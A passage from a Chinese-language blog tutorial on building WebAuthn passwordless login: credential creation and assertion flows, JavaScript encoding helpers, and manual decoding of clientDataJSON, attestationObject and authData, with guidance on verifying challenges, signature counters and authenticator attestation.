ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full 